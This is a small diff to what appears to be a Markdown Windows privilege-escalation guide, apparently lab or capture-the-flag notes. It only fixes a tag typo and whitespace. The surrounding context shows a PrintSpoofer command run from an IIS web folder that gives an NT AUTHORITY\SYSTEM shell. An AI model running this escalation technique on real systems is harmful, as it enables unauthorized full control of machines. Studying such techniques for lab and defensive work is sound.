@@ -800,7 +800,7 @@ The easiest way to gain access to another user is to gather credentials from a c
     </details>  
 
     <details>
-    <summary>PrintSpoofer.exe</summmary>
+    <summary>PrintSpoofer.exe</summary>
 
     ```
     C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
@@ -815,7 +815,7 @@ The easiest way to gain access to another user is to gather credentials from a c
     whoami
     nt authority\system
     ```  
-    
+
     </details>
 
 ### Abusing vulnerable software  
